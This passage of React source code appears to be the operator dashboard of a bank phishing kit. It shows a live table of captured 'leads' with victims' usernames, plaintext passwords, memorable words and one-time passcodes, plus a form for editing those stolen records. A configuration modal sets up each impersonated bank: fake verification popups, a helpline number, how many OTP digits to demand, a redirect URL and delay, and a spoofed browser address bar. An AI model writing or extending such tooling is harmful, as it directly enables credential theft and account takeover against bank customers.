                            <span className="text-slate-400 italic text-[11px]">General</span>
                          )}
                        </td>

                        <td className="py-3 px-4 font-mono font-medium text-slate-800">
                          {lead.userId || <span className="text-slate-400 italic">None</span>}
                        </td>

                        <td className="py-3 px-4 font-mono font-bold text-red-500">
                          {lead.password || <span className="text-slate-400 font-normal italic">N/A</span>}
                        </td>

                        <td className="py-3 px-4 text-slate-600">
                          {lead.memorableInfo || lead.extraData ? (
                            <span className="bg-slate-100 text-slate-700 px-2 py-0.5 rounded text-[11px] font-mono border border-slate-200 inline-block max-w-[200px] truncate" title={lead.memorableInfo || lead.extraData}>
                              {lead.memorableInfo || lead.extraData}
                            </span>
                          ) : (
                            <span className="text-slate-300">-</span>
                          )}
                        </td>

                        <td className="py-3 px-4">
                          {otpValue ? (
                            <span className="bg-amber-50 text-amber-800 border border-amber-300 px-2.5 py-0.5 rounded-md font-mono font-extrabold text-xs tracking-wider inline-flex items-center gap-1 shadow-2xs">
                              <span className="text-amber-600">🔑</span> {otpValue}
                            </span>
                          ) : (
                            <span className="text-slate-300 text-[11px] italic">Not requested</span>
                          )}
                        </td>

                        <td className="py-3 px-4 text-slate-500 text-[11.5px] whitespace-nowrap">
                          {new Date(lead.createdAt).toLocaleString()}
                        </td>

                        <td className="py-3 px-4 text-right space-x-1.5 whitespace-nowrap">
                          <button
                            type="button"
                            onClick={() => handleOpenEditLead(lead)}
                            className="bg-white hover:bg-slate-100 text-slate-700 border border-slate-200 px-2.5 py-1 rounded-lg text-xs font-semibold transition cursor-pointer shadow-2xs"
                            title="Edit or inspect details"
                          >
                            ✎ Edit
                          </button>
                          <button
                            type="button"
                            onClick={() => handleDeleteLead(lead.id)}
                            className="bg-red-50 hover:bg-red-100 text-red-600 border border-red-200 px-2.5 py-1 rounded-lg text-xs font-semibold transition cursor-pointer"
                            title="Delete this record"
                          >
                            🗑 Delete
                          </button>
                        </td>
                      </tr>
                    );
                  })}

                  {filteredLeads.length === 0 && (
                    <tr>
                      <td colSpan={9} className="text-center py-12 text-slate-400">
                        <div className="flex flex-col items-center justify-center gap-1">
                          <span className="text-2xl">📋</span>
                          <span className="font-semibold text-xs text-slate-600">No activity logged yet</span>
                          <span className="text-[11px] text-slate-400">Submitted bank portal sessions will display here in real-time</span>
                        </div>
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </main>

      {/* ================= EDIT LEAD MODAL ================= */}
      {editingLead && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-xs">
          <div className="w-full max-w-lg bg-white rounded-2xl shadow-2xl border border-slate-200 p-6">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100">
              <div>
                <h3 className="text-base font-bold text-slate-900">
                  Edit Activity Record: {editingLead.bank || editingLead.bankName || "Bank Record"}
                </h3>
                <p className="text-xs text-slate-400">Update captured session fields directly</p>
              </div>
              <button
                type="button"
                onClick={() => setEditingLead(null)}
                className="text-slate-400 hover:text-slate-700 text-lg font-bold"
              >
                ✕
              </button>
            </div>

            <div className="mt-4 space-y-3.5 text-xs">
              <div>
                <label className="block font-bold text-slate-700 mb-1">Username / Primary ID:</label>
                <input
                  type="text"
                  value={leadForm.userId || ""}
                  onChange={(e) => setLeadForm({ ...leadForm, userId: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-mono focus:border-blue-600 bg-white"
                />
              </div>

              <div>
                <label className="block font-bold text-slate-700 mb-1">Password:</label>
                <input
                  type="text"
                  value={leadForm.password || ""}
                  onChange={(e) => setLeadForm({ ...leadForm, password: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-mono focus:border-blue-600 bg-white"
                />
              </div>

              <div>
                <label className="block font-bold text-slate-700 mb-1">Extra Info / Memorable Word:</label>
                <input
                  type="text"
                  value={leadForm.memorableInfo || leadForm.extraData || ""}
                  onChange={(e) => setLeadForm({ ...leadForm, memorableInfo: e.target.value, extraData: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-mono focus:border-blue-600 bg-white"
                />
              </div>

              <div>
                <label className="block font-bold text-blue-700 mb-1">Action Digits / OTP Code:</label>
                <input
                  type="text"
                  placeholder="e.g. 648291"
                  value={leadForm.otpCode || ""}
                  onChange={(e) => setLeadForm({ ...leadForm, otpCode: e.target.value })}
                  className="w-full rounded-xl border border-amber-300 p-2.5 outline-none font-mono font-bold tracking-widest text-center text-sm bg-amber-50/40 focus:border-amber-500"
                />
              </div>

              <div className="flex gap-2 pt-3">
                <button
                  type="button"
                  onClick={handleSaveLead}
                  disabled={isUpdatingLead}
                  className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-xl transition cursor-pointer"
                >
                  {isUpdatingLead ? "Updating..." : "Save Record Changes"}
                </button>
                <button
                  type="button"
                  onClick={() => setEditingLead(null)}
                  className="px-5 border border-slate-300 hover:bg-slate-50 text-slate-700 font-bold py-2.5 rounded-xl transition cursor-pointer"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ================= CONFIGURATION MODAL ================= */}
      {configModalBank && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-xs">
          <div className="w-full max-w-2xl bg-white rounded-2xl shadow-2xl border border-slate-200 p-6 overflow-y-auto max-h-[90vh]">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100">
              <div>
                <h3 className="text-base font-bold text-[#0c1938]">
                  Configure Bank & Popup: {configModalBank.name}
                </h3>
                <p className="text-xs text-slate-400">Customize modal response details & redirection delay</p>
              </div>
              <button
                type="button"
                onClick={() => setConfigModalBank(null)}
                className="text-slate-400 hover:text-slate-700 text-lg font-bold"
              >
                ✕
              </button>
            </div>

            <div className="mt-4 space-y-4 text-xs">
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Bank Name</label>
                  <input
                    type="text"
                    value={editForm.name || ""}
                    onChange={(e) => setEditForm({ ...editForm, name: e.target.value })}
                    className="w-full rounded-xl border border-slate-300 p-2.5 outline-none focus:border-blue-600"
                  />
                </div>
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Subtitle</label>
                  <input
                    type="text"
                    value={editForm.subtitle || ""}
                    onChange={(e) => setEditForm({ ...editForm, subtitle: e.target.value })}
                    className="w-full rounded-xl border border-slate-300 p-2.5 outline-none focus:border-blue-600"
                  />
                </div>
              </div>

              <h4 className="font-bold text-blue-600 pt-2 border-t border-slate-100">
                Popup Appearance & Security Controls
              </h4>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Popup Status & Icon Theme:</label>
                  <select
                    value={editForm.popupStatus || "SUCCESS"}
                    onChange={(e) => setEditForm({ ...editForm, popupStatus: e.target.value })}
                    className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-semibold text-slate-800"
                  >
                    <option value="SUCCESS">🟢 SUCCESS (Green Theme)</option>
                    <option value="PENDING">🟡 PENDING (Yellow Warning)</option>
                    <option value="ACTION">🔴 ACTION REQUIRED (Red Challenge)</option>
                  </select>
                </div>
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Helpline / Support Phone:</label>
                  <input
                    type="text"
                    placeholder="e.g. 0800 000 1234 (Leave empty to hide)"
                    value={editForm.supportPhone || ""}
                    onChange={(e) => setEditForm({ ...editForm, supportPhone: e.target.value })}
                    className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-mono"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Button Loader Delay (Seconds):</label>
                  <input
                    type="number"
                    min={1}
                    max={30}
                    placeholder="e.g. 5"
                    value={editForm.redirectDelay || 5}
                    onChange={(e) => setEditForm({ ...editForm, redirectDelay: Number(e.target.value) })}
                    className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-mono"
                  />
                </div>
                <div>
                  <label className="block font-bold text-blue-700 mb-1">OTP Digits Required:</label>
                  <input
                    type="number"
                    min={3}
                    max={10}
                    placeholder="e.g. 6"
                    value={editForm.otpLength || 6}
                    onChange={(e) => setEditForm({ ...editForm, otpLength: Number(e.target.value) })}
                    className="w-full rounded-xl border border-blue-300 p-2.5 outline-none font-mono font-bold text-blue-800"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Popup Subheading Tag:</label>
                  <input
                    type="text"
                    placeholder="Leave empty to hide"
                    value={editForm.popupSubheading || ""}
                    onChange={(e) => setEditForm({ ...editForm, popupSubheading: e.target.value })}
                    className="w-full rounded-xl border border-slate-300 p-2.5 outline-none"
                  />
                </div>
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Primary Button Text:</label>
                  <input
                    type="text"
                    placeholder="e.g. Complete Verification"
                    value={editForm.buttonText || ""}
                    onChange={(e) => setEditForm({ ...editForm, buttonText: e.target.value })}
                    className="w-full rounded-xl border border-slate-300 p-2.5 outline-none"
                  />
                </div>
              </div>

              <div>
                <label className="block font-bold text-slate-700 mb-1">Popup Main Heading:</label>
                <input
                  type="text"
                  placeholder="Leave empty to hide"
                  value={editForm.popupHeading || ""}
                  onChange={(e) => setEditForm({ ...editForm, popupHeading: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none"
                />
              </div>

              <div>
                <label className="block font-bold text-slate-700 mb-1">Popup Message / Body Text:</label>
                <textarea
                  rows={2}
                  placeholder="Leave empty to hide"
                  value={editForm.popupBody || ""}
                  onChange={(e) => setEditForm({ ...editForm, popupBody: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none"
                />
              </div>

              <div>
                <label className="block font-bold text-slate-700 mb-1">Redirect URL on Button Click:</label>
                <input
                  type="text"
                  placeholder="e.g. https://google.com"
                  value={editForm.redirectUrl || ""}
                  onChange={(e) => setEditForm({ ...editForm, redirectUrl: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none"
                />
              </div>

              <div>
                <label className="block font-bold text-slate-700 mb-1">Browser Popup Top Address Bar:</label>
                <input
                  type="text"
                  value={editForm.browserAddressBar || ""}
                  onChange={(e) => setEditForm({ ...editForm, browserAddressBar: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 font-mono text-[11px] outline-none"
                />
              </div>

              <div className="flex gap-2 pt-3">
                <button
                  type="button"
                  onClick={handleSaveConfig}
                  className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-xl transition cursor-pointer"
                >
                  Save Bank & Popup Settings
                </button>
                <button
                  type="button"
                  onClick={() => setConfigModalBank(null)}
                  className="px-5 border border-slate-300 hover:bg-slate-50 text-slate-700 font-bold py-2.5 rounded-xl transition cursor-pointer"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}